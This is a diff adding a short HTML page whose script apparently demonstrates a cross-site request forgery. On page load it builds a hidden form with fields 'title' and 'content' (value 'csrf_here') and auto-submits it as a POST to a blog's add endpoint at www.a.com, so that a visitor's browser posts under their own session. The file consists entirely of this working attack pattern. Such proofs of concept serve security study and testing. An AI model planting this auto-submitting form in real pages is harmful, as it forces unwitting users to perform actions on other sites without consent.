@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+</head>
+<body>
+	<script>
+		function createForm() {
+			var new_form = document.createElement("form");
+			document.body.appendChild(new_form);
+			new_form.method = "post";
+			return new_form;
+		}
+
+		function createInputEle(parent_form, input_name, input_value) {
+			var input_element = document.createElement("input");
+			parent_form.appendChild(input_element);
+			input_element.type = "text";
+			input_element.name = input_name;
+			input_element.style.display = "none";
+			input_element.value = input_value;
+			return input_element;
+		}
+
+		var form1 = createForm();
+		createInputEle(form1, "title","hi");
+		createInputEle(form1, "content","csrf_here");
+		form1.action = "http://www.a.com/blog/add";
+		form1.submit();
+
+	</script>
+</body>
+</html>
